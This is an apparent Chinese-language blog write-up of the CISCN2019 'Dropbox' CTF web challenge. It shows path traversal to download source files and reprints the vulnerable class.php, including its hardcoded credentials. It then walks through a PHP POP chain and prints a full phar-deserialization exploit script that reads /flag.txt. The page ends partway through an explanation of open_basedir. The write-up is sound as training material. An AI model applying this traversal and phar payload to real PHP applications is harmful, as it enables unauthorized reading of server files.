@@ -1,0 +1,582 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>[CISCN2019 华北赛区 Day1 Web1]Dropbox | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="牛魔的这道题没给我做死了差点 进入题目就是一个登录界面，这里用SQL注入是不行的，我们正常的注册登录之后就进来了一个传文件的地方，我们一路上看URL处和抓包的情况来看，有以下几个目录： login.php index.php download.php  regist.php login.php 我们尝试了之后发现只有图片能够上传，然后试了其他方法也没什么用 但是我们点下载之后会看见这里有个file">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[CISCN2019 华北赛区 Day1 Web1]Dropbox">
+<meta property="og:url" content="http://example.com/2026/03/02/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="牛魔的这道题没给我做死了差点 进入题目就是一个登录界面，这里用SQL注入是不行的，我们正常的注册登录之后就进来了一个传文件的地方，我们一路上看URL处和抓包的情况来看，有以下几个目录： login.php index.php download.php  regist.php login.php 我们尝试了之后发现只有图片能够上传，然后试了其他方法也没什么用 但是我们点下载之后会看见这里有个file">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/ctf/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox/image-20260302144616120.png">
+<meta property="og:image" content="http://example.com/images/ctf/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox/image-20260302182243506.png">
+<meta property="og:image" content="http://example.com/images/ctf/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox/image-20260302184507222.png">
+<meta property="og:image" content="http://example.com/images/ctf/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox/image-20260302190103978.png">
+<meta property="og:image" content="http://example.com/images/ctf/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox/image-20260302190501589.png">
+<meta property="og:image" content="http://example.com/images/ctf/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox/image-20260302214103746.png">
+<meta property="og:image" content="http://example.com/images/ctf/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox/image-20260302214537543.png">
+<meta property="og:image" content="http://example.com/images/ctf/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox/image-20260302214700569.png">
+<meta property="og:image" content="http://example.com/images/ctf/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox/image-20260302214857458.png">
+<meta property="og:image" content="http://example.com/images/ctf/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox/image-20260302214941649.png">
+<meta property="og:image" content="http://example.com/images/ctf/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox/image-20260302215727250.png">
+<meta property="og:image" content="http://example.com/images/ctf/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox/image-20260302220326608.png">
+<meta property="og:image" content="http://example.com/images/ctf/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox/image-20260302220400887.png">
+<meta property="article:published_time" content="2026-03-02T14:58:50.000Z">
+<meta property="article:modified_time" content="2026-03-02T15:42:22.448Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/ctf/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox/image-20260302144616120.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
+
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-CISCN2019-华北赛区-Day1-Web1-Dropbox" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2026/03/02/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox/" class="article-date">
+  <time class="dt-published" datetime="2026-03-02T14:58:50.000Z" itemprop="datePublished">2026-03-02</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      [CISCN2019 华北赛区 Day1 Web1]Dropbox
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>牛魔的这道题没给我做死了差点</p>
+<p>进入题目就是一个登录界面，这里用SQL注入是不行的，我们正常的注册登录之后就进来了一个传文件的地方，我们一路上看URL处和抓包的情况来看，有以下几个目录：</p>
+<p>login.php index.php download.php  regist.php login.php</p>
+<p>我们尝试了之后发现只有图片能够上传，然后试了其他方法也没什么用</p>
+<p>但是我们点下载之后会看见这里有个filename，就联想到如果这里的filename是可控的，那么我是不是可以通过控制这个参数来实现对其他东西的下载呢</p>
+<p><img src="/../images/ctf/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox/image-20260302144616120.png" alt="image-20260302144616120"></p>
+<p>试了一下发现我们想要下载的东西都不在当前目录，我们必须要上两层目录才可以下载也就是..&#x2F;..&#x2F;index.php</p>
+<p>index.php:</p>
+<p><strong>&lt;?php</strong></p>
+<p>session_start();</p>
+<p><strong>if</strong> (!<strong>isset</strong>($_SESSION[‘login’])) {</p>
+<p>  header(“Location: login.php”);</p>
+<p>  <strong>die</strong>();</p>
+<p>}</p>
+<p><strong>?&gt;</strong></p>
+<!DOCTYPE html>
+
+<html>
+
+
+
+<meta charset="utf-8">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<title>网盘管理</title>
+
+
+
+<head>
+
+  <link href="static/css/bootstrap.min.css" rel="stylesheet">
+
+  <link href="static/css/panel.css" rel="stylesheet">
+
+<pre><code>&lt;script src=&quot;static/js/jquery.min.js&quot;&gt;&lt;/script&gt;
+
+&lt;script src=&quot;static/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;
+
+&lt;script src=&quot;static/js/toast.js&quot;&gt;&lt;/script&gt;
+
+&lt;script src=&quot;static/js/panel.js&quot;&gt;&lt;/script&gt;
+</code></pre>
+</head>
+
+
+
+<body>
+
+  <nav aria-label="breadcrumb">
+
+  <ol **class**="breadcrumb">
+
+<p>​    &lt;li **class**&#x3D;”breadcrumb-item active”&gt;管理面板</li></p>
+<p>​    &lt;li **class**&#x3D;”breadcrumb-item active”&gt;&lt;label **for**&#x3D;”fileInput” **class**&#x3D;”fileLabel”&gt;上传文件</label></li></p>
+<p>​    &lt;li **class**&#x3D;”active ml-auto”&gt;<a href="#">你好 <strong><?php** **echo** $_SESSION['username']**?></strong></a></li></p>
+  </ol>
+
+</nav>
+
+<p>&lt;input type&#x3D;”file” id&#x3D;”fileInput” **class**&#x3D;”hidden”&gt;</p>
+<div class="top" id="toast-container"></div>
+
+
+
+<p><strong>&lt;?php</strong></p>
+<p><strong>include</strong> “class.php”;</p>
+<p>$a &#x3D; <strong>new</strong> FileList($_SESSION[‘sandbox’]);</p>
+<p>$a-&gt;Name();</p>
+<p>$a-&gt;Size();</p>
+<p><strong>?&gt;</strong></p>
+<p>Class.php</p>
+<p><strong>&lt;?php</strong></p>
+<p>error_reporting(0);</p>
+<p>$dbaddr &#x3D; “127.0.0.1”;</p>
+<p>$dbuser &#x3D; “root”;</p>
+<p>$dbpass &#x3D; “root”;</p>
+<p>$dbname &#x3D; “dropbox”;</p>
+<p>$db &#x3D; <strong>new</strong> mysqli($dbaddr, $dbuser, $dbpass, $dbname);</p>
+<p><strong>class</strong> User {</p>
+<p>  public $db;</p>
+<p>  public <strong>function</strong> __construct() {</p>
+<p>​    <strong>global</strong> $db;</p>
+<p>​    $this-&gt;db &#x3D; $db;</p>
+<p>  }</p>
+<p>  public <strong>function</strong> user_exist($username) {</p>
+<p>​    $stmt &#x3D; $this-&gt;db-&gt;prepare(“SELECT <code>username</code> FROM <code>users</code> WHERE <code>username</code> &#x3D; ? LIMIT 1;”);</p>
+<p>​    $stmt-&gt;bind_param(“s”, $username);</p>
+<p>​    $stmt-&gt;execute();</p>
+<p>​    $stmt-&gt;store_result();</p>
+<p>​    $count &#x3D; $stmt-&gt;num_rows;</p>
+<p>​    <strong>if</strong> ($count &#x3D;&#x3D;&#x3D; 0) {</p>
+<p>​      <strong>return</strong> false;</p>
+<p>​    }</p>
+<p>​    <strong>return</strong> true;</p>
+<p>  }</p>
+<p>  public <strong>function</strong> add_user($username, $password) {</p>
+<p>​    <strong>if</strong> ($this-&gt;user_exist($username)) {</p>
+<p>​      <strong>return</strong> false;</p>
+<p>​    }</p>
+<p>​    $password &#x3D; sha1($password <strong>.</strong> “SiAchGHmFx”);</p>
+<p>​    $stmt &#x3D; $this-&gt;db-&gt;prepare(“INSERT INTO <code>users</code> (<code>id</code>, <code>username</code>, <code>password</code>) VALUES (NULL, ?, ?);”);</p>
+<p>​    $stmt-&gt;bind_param(“ss”, $username, $password);</p>
+<p>​    $stmt-&gt;execute();</p>
+<p>​    <strong>return</strong> true;</p>
+<p>  }</p>
+<p>  public <strong>function</strong> verify_user($username, $password) {</p>
+<p>​    <strong>if</strong> (!$this-&gt;user_exist($username)) {</p>
+<p>​      <strong>return</strong> false;</p>
+<p>​    }</p>
+<p>​    $password &#x3D; sha1($password <strong>.</strong> “SiAchGHmFx”);</p>
+<p>​    $stmt &#x3D; $this-&gt;db-&gt;prepare(“SELECT <code>password</code> FROM <code>users</code> WHERE <code>username</code> &#x3D; ?;”);</p>
+<p>​    $stmt-&gt;bind_param(“s”, $username);</p>
+<p>​    $stmt-&gt;execute();</p>
+<p>​    $stmt-&gt;bind_result($expect);</p>
+<p>​    $stmt-&gt;fetch();</p>
+<p>​    <strong>if</strong> (<strong>isset</strong>($expect) &amp;&amp; $expect &#x3D;&#x3D;&#x3D; $password) {</p>
+<p>​      <strong>return</strong> true;</p>
+<p>​    }</p>
+<p>​    <strong>return</strong> false;</p>
+<p>  }</p>
+<p>  public <strong>function</strong> __destruct() {</p>
+<p>​    $this-&gt;db-&gt;close();</p>
+<p>  }</p>
+<p>}</p>
+<p><strong>class</strong> FileList {</p>
+<p>  private $files;</p>
+<p>  private $results;</p>
+<p>  private $funcs;</p>
+<p>  public <strong>function</strong> __construct($path) {</p>
+<p>​    $this-&gt;files &#x3D; <strong>array</strong>();</p>
+<p>​    $this-&gt;results &#x3D; <strong>array</strong>();</p>
+<p>​    $this-&gt;funcs &#x3D; <strong>array</strong>();</p>
+<p>​    $filenames &#x3D; scandir($path);</p>
+<p>​    $key &#x3D; array_search(“.”, $filenames);</p>
+<p>​    <strong>unset</strong>($filenames[$key]);</p>
+<p>​    $key &#x3D; array_search(“..”, $filenames);</p>
+<p>​    <strong>unset</strong>($filenames[$key]);</p>
+<p>​    <strong>foreach</strong> ($filenames <strong>as</strong> $filename) {</p>
+<p>​      $file &#x3D; <strong>new</strong> File();</p>
+<p>​      $file-&gt;open($path <strong>.</strong> $filename);</p>
+<p>​      array_push($this-&gt;files, $file);</p>
+<p>​      $this-&gt;results[$file-&gt;name()] &#x3D; <strong>array</strong>();</p>
+<p>​    }</p>
+<p>  }</p>
+<p>  public <strong>function</strong> __call($func, $args) {</p>
+<p>​    array_push($this-&gt;funcs, $func);</p>
+<p>​    <strong>foreach</strong> ($this-&gt;files <strong>as</strong> $file) {</p>
+<p>​      $this-&gt;results[$file-&gt;name()][$func] &#x3D; $file-&gt;$func();</p>
+<p>​    }</p>
+<p>  }</p>
+<p>  public <strong>function</strong> __destruct() {</p>
+<p>​    $table &#x3D; ‘<div id="container" class="container"><div class="table-responsive"><table id="table" class="table table-bordered table-hover sm-font">‘;</p>
+<p>​    $table <strong>.</strong>&#x3D; ‘<thead><tr>‘;</p>
+<p>​    <strong>foreach</strong> ($this-&gt;funcs <strong>as</strong> $func) {</p>
+<p>​      $table <strong>.</strong>&#x3D; ‘<th scope="col" class="text-center">‘ <strong>.</strong> htmlentities($func) <strong>.</strong> ‘</th>‘;</p>
+<p>​    }</p>
+<p>​    $table <strong>.</strong>&#x3D; ‘<th scope="col" class="text-center">Opt</th>‘;</p>
+<p>​    $table <strong>.</strong>&#x3D; ‘</thead><tbody>‘;</p>
+<p>​    <strong>foreach</strong> ($this-&gt;results <strong>as</strong> $filename &#x3D;&gt; $result) {</p>
+<p>​      $table <strong>.</strong>&#x3D; ‘<tr>‘;</p>
+<p>​      <strong>foreach</strong> ($result <strong>as</strong> $func &#x3D;&gt; $value) {</p>
+<p>​        $table <strong>.</strong>&#x3D; ‘<td class="text-center">‘ <strong>.</strong> htmlentities($value) <strong>.</strong> ‘</td>‘;</p>
+<p>​      }</p>
+<p>​      $table <strong>.</strong>&#x3D; ‘<td class="text-center" filename="' **.** htmlentities($filename) **.** '"><a href="#" class="download">下载</a> &#x2F; <a href="#" class="delete">删除</a></td>‘;</p>
+<p>​      $table <strong>.</strong>&#x3D; ‘</tr>‘;</p>
+<p>​    }</p>
+<p>​    <strong>echo</strong> $table;</p>
+<p>  }</p>
+<p>}</p>
+<p><strong>class</strong> File {</p>
+<p>  public $filename;</p>
+<p>  public <strong>function</strong> open($filename) {</p>
+<p>​    $this-&gt;filename &#x3D; $filename;</p>
+<p>​    <strong>if</strong> (file_exists($filename) &amp;&amp; !is_dir($filename)) {</p>
+<p>​      <strong>return</strong> true;</p>
+<p>​    } <strong>else</strong> {</p>
+<p>​      <strong>return</strong> false;</p>
+<p>​    }</p>
+<p>  }</p>
+<p>  public <strong>function</strong> name() {</p>
+<p>​    <strong>return</strong> basename($this-&gt;filename);</p>
+<p>  }</p>
+<p>  public <strong>function</strong> size() {</p>
+<p>​    $size &#x3D; filesize($this-&gt;filename);</p>
+<p>​    $units &#x3D; <strong>array</strong>(‘ B’, ‘ KB’, ‘ MB’, ‘ GB’, ‘ TB’);</p>
+<p>​    <strong>for</strong> ($i &#x3D; 0; $size &gt;&#x3D; 1024 &amp;&amp; $i &lt; 4; $i++) $size &#x2F;&#x3D; 1024;</p>
+<p>​    <strong>return</strong> round($size, 2)<strong>.</strong>$units[$i];</p>
+<p>  }</p>
+<p>  public <strong>function</strong> detele() {</p>
+<p>​    unlink($this-&gt;filename);</p>
+<p>  }</p>
+<p>  public <strong>function</strong> close() {</p>
+<p>​    <strong>return</strong> file_get_contents($this-&gt;filename);</p>
+<p>  }</p>
+<p>}</p>
+<p><strong>?&gt;</strong></p>
+<p><img src="/../images/ctf/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox/image-20260302182243506.png" alt="image-20260302182243506"></p>
+<p>这样太烂了我还是在网上的wp上截取一下</p>
+<p>index.php:</p>
+<p>这里还引用了一个class.php</p>
+<p>我们再下载一个class.php</p>
+<p><img src="/../images/ctf/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox/image-20260302184507222.png" alt="image-20260302184507222"></p>
+<p>这个就是class.php就是最核心的一个代码</p>
+<p>首先我们很明显能够看见这里的&#x3D;File类里面有一个close方法，而close方法里面有一个非常重要的file_get_contents()函数，这个就是典型的会受到phar反序列化影响的函数，也就是说这里我们可以作为一个切入点</p>
+<p>在User和FileLIst类都有destrcut，但是Filelist类里面有非常多的前段元素，也就是说这里应该作用不是用于给我们解题的，而User的des方法</p>
+<p><img src="/../images/ctf/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox/image-20260302190103978.png" alt="image-20260302190103978"></p>
+<p>刚好db可控，还会调用close方法，那么这里应该就是要用user的destruct方法了但是问题又来了</p>
+<p>close方法只有return，也就是说没回显，这里就难了，直接两个连一起肯定是不行的，这里就要用到Filelist里面的了</p>
+<p><img src="/../images/ctf/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox/image-20260302190501589.png" alt="image-20260302190501589"></p>
+<p>上面我们说了，des方法应该有自己的作用，我们这里就不考虑了，然后我们看这两个方法</p>
+<p>constrcut方法</p>
+<p>![截屏2026-03-02 19.29.35](&#x2F;Users&#x2F;yuanbaoyin&#x2F;Desktop&#x2F;截屏2026-03-02 19.29.35.png)</p>
+<p>这里更重要的是call方法了</p>
+<p>这里会把调用的不存在的函数</p>
+<p>第 1 行：<code>array_push($this-&gt;funcs, $func);</code></p>
+<ul>
+<li><p>$func &#x3D; “close”（你调用的不存在的方法名）；</p>
+</li>
+<li><p>作用：把 “close” 这个方法名存入<code>$funcs</code>数组</p>
+</li>
+<li><h5 id="第-2-行：foreach-this-files-as-file"><a href="#第-2-行：foreach-this-files-as-file" class="headerlink" title="第 2 行：foreach ($this-&gt;files as $file) {"></a>第 2 行：<code>foreach ($this-&gt;files as $file) {</code></h5><ul>
+<li>$this-&gt;files &#x3D; [我们构造的 File 对象（filename&#x3D;&#x2F;flag）]；</li>
+<li>作用：遍历 $files 里的每一个 File 对象</li>
+</ul>
+<h5 id="第-3-行：-this-results-file-name-func-file-func"><a href="#第-3-行：-this-results-file-name-func-file-func" class="headerlink" title="第 3 行：$this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();"></a>第 3 行：<code>$this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();</code></h5><p>拆成 3 个小步骤看：</p>
+<ol>
+<li><code>$file-&gt;name()</code>：调用 File::name ()，返回文件名（&#x2F;flag 的 basename 是 “flag”）；</li>
+<li><code>$file-&gt;$func()</code>：是，所以等价于file-&gt;close ()&#96;—— 调用 File::close ()，读取 &#x2F;flag 的内容；</li>
+<li>赋值：把 “flag” 作为 key1，“close” 作为 key2，把 &#x2F;flag 的内容作为值，存入<code>$results</code>数组；</li>
+</ol>
+</li>
+</ul>
+<p>我们已经构造好：</p>
+<ul>
+<li>$filelist-&gt;files &#x3D; [new File (“flag”)]（File 对象的 filename&#x3D;&#x2F;flag）；</li>
+<li>调用 $filelist-&gt;close ()（触发__call）。</li>
+</ul>
+<p>执行步骤：</p>
+<ol>
+<li><p>触发__call，，args&#x3D;[]（没传参数）；</p>
+</li>
+<li><p>执行第 1 行：$funcs 数组变成 [“close”]；</p>
+</li>
+<li><p>执行第 2 行：遍历 $files 里的 File 对象（只有 1 个，对应 &#x2F;flag）；</p>
+</li>
+<li><p>执行第 3 行：</p>
+<ul>
+<li>$file-&gt;name () → 返回 “flag”；</li>
+<li>$file-&gt;close () → 读取 &#x2F;flag 的内容（比如 “flag {123456}”）；</li>
+<li>$results[“flag”][“close”] &#x3D; “flag{123456}”；</li>
+</ul>
+</li>
+<li><p>__call 执行完毕，$results 数组里已经存了 &#x2F;flag 的内容。</p>
+</li>
+</ol>
+<p>可能还是会疑问，为什么这里必须要用call来呢，原因就在于这里是可以回显的</p>
+<p>很明显的一个点就在于这里是有echo的</p>
+<p>public function __destruct() {  </p>
+<p>  $table &#x3D; ‘’;    &#x2F;&#x2F; 遍历$results里的flag内容，拼接到HTML里   </p>
+<p> foreach ($this-&gt;results as $filename &#x3D;&gt; $result) {       </p>
+<p>   foreach ($result as $func &#x3D;&gt; $value) {          </p>
+<p>​    $table .&#x3D; ‘<td>‘ . $value . ‘</td>‘; &#x2F;&#x2F; 把flag内容拼进去       </p>
+<p>   }    }    </p>
+<p>echo $table; &#x2F;&#x2F; 关键！把拼好的内容直接输出到页面 }</p>
+<p>这里会将result数组的值一个一个遍历输入给value然后给table最后echo出来</p>
+<p>构造：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">FileList</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;files = <span class="keyword">array</span>(<span class="keyword">new</span> <span class="title class_">File</span>());</span><br><span class="line">                <span class="comment">#由于file参数是从files。foreach读取的。而foreach要求是个数组。所以这边要用数组</span></span><br><span class="line">                <span class="variable language_">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;funcs = <span class="keyword">array</span>();   </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;filename=<span class="string">&#x27;/flag.txt&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">    <span class="variable">$a</span>-&gt;db=<span class="keyword">new</span> <span class="title class_">FileList</span>();</span><br><span class="line">    @<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>(); </span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); </span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>); </span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure>
+
+<p>我们上面说到了会有foreach，所以这里的files就必须还是数组，而里面必须是new File，这是因为：</p>
+<p><img src="/../images/ctf/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox/image-20260302214103746.png" alt="image-20260302214103746"></p>
+<p>看似是$file调用name，但是$file的值是$files遍历后传的，也就是这里要求files有name（）所以要这么干</p>
+<p>而后就是运行了，在运行之前必须把phar.readonly给改成off，默认关闭的</p>
+<p>我这里是拿的kali做的，我觉得自己还是搞复杂了，后面在优化吧：</p>
+<p>kali自带php环境，输入php –ini</p>
+<p>Loaded这个就是</p>
+<p><img src="/../images/ctf/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox/image-20260302214537543.png" alt="image-20260302214537543"></p>
+<p>然后用nano改</p>
+<p><img src="/../images/ctf/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox/image-20260302214700569.png" alt="image-20260302214700569"></p>
+<p>control+w搜索，control加o保存，control加x退出</p>
+<p>改了在创一个去跑我们的脚本：</p>
+<p><img src="/../images/ctf/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox/image-20260302214857458.png" alt="image-20260302214857458"></p>
+<p>然后告诉我失败了，只能用个临时的方法了：</p>
+<p><img src="/../images/ctf/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox/image-20260302214941649.png" alt="image-20260302214941649"></p>
+<p>ls -l之后是这样就OK了</p>
+<p>然后脚本写好了，我就直接在下载的时候抓包然后给filename改了，其实不行，看了网上的wp</p>
+<p>我们的dowload.php会卡目录</p>
+<p>. <code>ini_set()</code> 函数</p>
+<ul>
+<li><strong>作用</strong>：PHP 内置函数，用于<strong>动态修改 php.ini 配置文件中的配置项</strong>（只对当前脚本生效，脚本执行完就失效，不会改物理的 php.ini 文件）。</li>
+<li><strong>参数格式</strong>：<code>ini_set(配置项名称, 配置值)</code>。</li>
+<li><strong>对比</strong>：如果直接改 php.ini 里的<code>open_basedir</code>，会对所有 PHP 脚本生效；用<code>ini_set()</code>只影响当前脚本，灵活性更高。</li>
+</ul>
+<ol start="2">
+<li><code>&quot;open_basedir&quot;</code>（配置项名称）</li>
+</ol>
+<ul>
+<li><strong>中文含义</strong>：“基于目录的开放限制”，是 PHP 的核心安全配置项。</li>
+<li><strong>作用</strong>：限制 PHP 脚本的文件操作（比如<code>fopen()</code>、<code>file_get_contents()</code>、<code>unlink()</code>等）只能在指定的目录及其子目录下进行。</li>
+<li><strong>安全意义</strong>：防止恶意脚本访问 &#x2F; 篡改服务器上的敏感文件（比如<code>/etc/passwd</code>、其他网站的源码文件等），是 PHP 防护的重要手段。</li>
+</ul>
+<ol start="3">
+<li><code>getcwd() . &quot;:/etc:/tmp&quot;</code>（配置值）</li>
+</ol>
+<p>这是<code>open_basedir</code>的具体限制规则，拆解：</p>
+<p>(1) <code>getcwd()</code> 函数</p>
+<ul>
+<li><strong>全称</strong>：get current working directory（获取当前工作目录）。</li>
+<li><strong>作用</strong>：返回 PHP 脚本当前执行的目录路径（比如脚本放在<code>/var/www/html</code>，就返回这个路径）。</li>
+<li><strong>示例</strong>：如果脚本在<code>/home/user/project</code>下运行，<code>getcwd()</code>就返回<code>/home/user/project</code>。</li>
+</ul>
+<p>(2) 分隔符 <code>:</code>（Linux&#x2F;Mac）&#x2F; <code>;</code>（Windows）</p>
+<ul>
+<li><p><code>open_basedir</code> 支持指定多个目录，不同系统用不同分隔符：</p>
+<ul>
+<li>Linux&#x2F;Mac&#x2F;Unix：用<strong>冒号<code>:</code></strong> 分隔多个目录；</li>
+<li>Windows：用<strong>分号<code>;</code></strong> 分隔（比如<code>getcwd() . &quot;;C:\Windows\Temp&quot;</code>）。</li>
+</ul>
+</li>
+</ul>
+<p>(3) <code>:/etc:/tmp</code></p>
+<ul>
+<li><p>拼接后整体含义：允许 PHP 脚本访问的目录包括：</p>
+<ol>
+<li><code>getcwd()</code> 返回的<strong>当前脚本目录</strong>；</li>
+<li><code>/etc</code> 目录（Linux 系统的系统配置目录）；</li>
+<li><code>/tmp</code> 目录（Linux 系统的临时文件目录）。</li>
+</ol>
+</li>
+</ul>
+<p>实际效果示例</p>
+<p>假设你的脚本运行目录是<code>/var/www/html</code>，这行代码执行后：</p>
+<p>✅ 允许的操作：</p>
+<ul>
+<li><p>读取<code>/var/www/html/test.txt</code>（当前目录）；</p>
